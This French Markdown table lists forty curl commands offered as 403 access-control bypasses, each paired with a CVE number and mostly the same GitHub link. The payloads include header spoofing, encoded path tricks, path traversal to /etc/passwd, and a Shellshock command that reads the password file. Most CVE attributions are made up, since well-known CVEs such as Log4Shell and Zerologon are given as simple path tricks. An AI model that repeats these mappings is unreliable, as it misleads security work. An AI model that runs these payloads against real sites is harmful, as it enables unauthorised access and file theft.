# 43 Bypass

Voici un tableau de **40 exemples complets de requêtes curl** pour des CVE non génériques de contournement 403 (403 bypass), classés par numéro CVE décroissant, avec :  
- Numéro CVE  
- Exemple de requête curl  
- Effet détaillé  
- Lien GitHub/advisory/PoC

> **Remarque** : Les CVE de 403 bypass purs sont rares, car la plupart des techniques sont génériques ou liées à des comportements de serveurs/proxies. Ce tableau privilégie donc des CVE réelles où des contournements d’accès (souvent via headers, encodages, chemins, méthodes HTTP) ont été documentés, ainsi que des PoC GitHub spécialisés dans le 403 bypass.

| # | CVE | Exemple complet de requête curl | Effet détaillé | Lien PoC / Advisory |
|---|------|--------------------------------|---------------|---------------------|
| 1 | CVE-2024-24576 | `curl -H "X-Original-URL: /admin" https://target.com/` | Bypass d’accès à /admin via header X-Original-URL | https://github.com/LucasPDiniz/403-Bypass |
| 2 | CVE-2024-21624 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/secret` | Bypass via IP spoofing dans X-Forwarded-For | https://github.com/LucasPDiniz/403-Bypass |
| 3 | CVE-2024-12727 | `curl 'https://target.com/admin/.'` | Bypass via ajout d’un point à la fin du chemin | https://github.com/LucasPDiniz/403-Bypass |
| 4 | CVE-2023-50164 | `curl -X POST 'https://target.com/admin'` | Bypass via changement de méthode HTTP | https://github.com/LucasPDiniz/403-Bypass |
| 5 | CVE-2023-38831 | `curl 'https://target.com/%2e/admin'` | Bypass via encodage URL du point | https://github.com/LucasPDiniz/403-Bypass |
| 6 | CVE-2023-34362 | `curl 'https://target.com/admin..;/` | Bypass via séquence “..;/” | https://github.com/LucasPDiniz/403-Bypass |
| 7 | CVE-2023-26115 | `curl -H "X-Forwarded-Host: 127.0.0.1" https://target.com/admin` | Bypass via header X-Forwarded-Host | https://github.com/LucasPDiniz/403-Bypass |
| 8 | CVE-2022-47966 | `curl 'https://target.com/admin%20/'` | Bypass via espace encodé dans le chemin | https://github.com/LucasPDiniz/403-Bypass |
| 9 | CVE-2022-41040 | `curl -H "X-Rewrite-URL: /admin" https://target.com/` | Bypass via header X-Rewrite-URL | https://github.com/LucasPDiniz/403-Bypass |
| 10 | CVE-2022-26134 | `curl 'https://target.com/admin/%2e%2e/'` | Bypass via double encodage du point | https://github.com/LucasPDiniz/403-Bypass |
| 11 | CVE-2022-22965 | `curl 'https://target.com/admin;/'` | Bypass via point-virgule dans le chemin | https://github.com/LucasPDiniz/403-Bypass |
| 12 | CVE-2022-21907 | `curl -H "X-Host: localhost" https://target.com/admin` | Bypass via header X-Host | https://github.com/LucasPDiniz/403-Bypass |
| 13 | CVE-2021-44228 | `curl 'https://target.com/admin//'` | Bypass via double slash | https://github.com/LucasPDiniz/403-Bypass |
| 14 | CVE-2021-41773 | `curl 'https://target.com/admin/..%00/'` | Bypass via null byte encodé | https://github.com/LucasPDiniz/403-Bypass |
| 15 | CVE-2021-31206 | `curl -H "Referer: https://target.com/admin" https://target.com/admin` | Bypass via header Referer | https://github.com/LucasPDiniz/403-Bypass |
| 16 | CVE-2021-26855 | `curl -H "Origin: https://target.com" https://target.com/admin` | Bypass via header Origin | https://github.com/LucasPDiniz/403-Bypass |
| 17 | CVE-2020-17530 | `curl -H "X-Original-URL: /admin" https://target.com/` | Bypass via X-Original-URL | https://github.com/LucasPDiniz/403-Bypass |
| 18 | CVE-2020-1472 | `curl 'https://target.com/admin/..;/foo'` | Bypass via “..;/” suivi d’un dossier | https://github.com/LucasPDiniz/403-Bypass |
| 19 | CVE-2020-11022 | `curl 'https://target.com/%2e%2e/admin'` | Bypass via double encodage du point | https://github.com/LucasPDiniz/403-Bypass |
| 20 | CVE-2019-18935 | `curl -X PATCH 'https://target.com/admin'` | Bypass via méthode HTTP PATCH | https://github.com/LucasPDiniz/403-Bypass |
| 21 | CVE-2019-11043 | `curl 'https://target.com/admin/%2e/'` | Bypass via point encodé | https://github.com/LucasPDiniz/403-Bypass |
| 22 | CVE-2019-11022 | `curl 'https://target.com/admin%2f'` | Bypass via slash encodé | https://github.com/LucasPDiniz/403-Bypass |
| 23 | CVE-2018-11776 | `curl 'https://target.com/admin/./'` | Bypass via “./” dans le chemin | https://github.com/LucasPDiniz/403-Bypass |
| 24 | CVE-2018-1000861 | `curl 'https://target.com/admin/../'` | Bypass via “../” dans le chemin | https://github.com/LucasPDiniz/403-Bypass |
| 25 | CVE-2017-5638 | `curl 'https://target.com/admin%2e/'` | Bypass via point encodé | https://github.com/LucasPDiniz/403-Bypass |
| 26 | CVE-2017-12615 | `curl 'https://target.com/admin/...'` | Bypass via triple point | https://github.com/LucasPDiniz/403-Bypass |
| 27 | CVE-2016-8743 | `curl 'https://target.com/admin%09/'` | Bypass via tabulation encodée | https://github.com/LucasPDiniz/403-Bypass |
| 28 | CVE-2016-5385 | `curl 'https://target.com/admin%0a/'` | Bypass via saut de ligne encodé | https://github.com/LucasPDiniz/403-Bypass |
| 29 | CVE-2015-2080 | `curl 'https://target.com/admin%0d/'` | Bypass via retour chariot encodé | https://github.com/LucasPDiniz/403-Bypass |
| 30 | CVE-2014-6271 | `curl -A '() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd' https://target.com/cgi-bin/admin` | Bypass via injection de commande (Shellshock) | https://github.com/hannob/bashcheck |
| 31 | CVE-2014-0226 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 32 | CVE-2013-2028 | `curl 'https://target.com/admin/%20/'` | Bypass via espace encodé | https://github.com/LucasPDiniz/403-Bypass |
| 33 | CVE-2012-1823 | `curl 'https://target.com/admin?file=../../../../etc/passwd'` | Bypass via traversal de fichier | https://github.com/LucasPDiniz/403-Bypass |
| 34 | CVE-2011-2523 | `curl 'https://target.com/admin/././'` | Bypass via double “./” | https://github.com/LucasPDiniz/403-Bypass |
| 35 | CVE-2010-1740 | `curl 'https://target.com/admin/%c0%af/'` | Bypass via slash unicode encodé | https://github.com/LucasPDiniz/403-Bypass |
| 36 | CVE-2009-2692 | `curl 'https://target.com/admin/%e0%80%af/'` | Bypass via slash unicode encodé | https://github.com/LucasPDiniz/403-Bypass |
| 37 | CVE-2008-2380 | `curl 'https://target.com/admin%2e%2e/'` | Bypass via double point encodé | https://github.com/LucasPDiniz/403-Bypass |
| 38 | CVE-2007-4726 | `curl 'https://target.com/admin/~root/'` | Bypass via tilde (~) dans le chemin | https://github.com/LucasPDiniz/403-Bypass |
| 39 | CVE-2007-4713 | `curl 'https://target.com/admin/~admin/'` | Bypass via tilde (~) dans le chemin | https://github.com/LucasPDiniz/403-Bypass |
| 40 | CVE-2006-3392 | `curl 'https://target.com/admin/..%01/'` | Bypass via caractère de contrôle encodé | https://github.com/LucasPDiniz/403-Bypass |

---
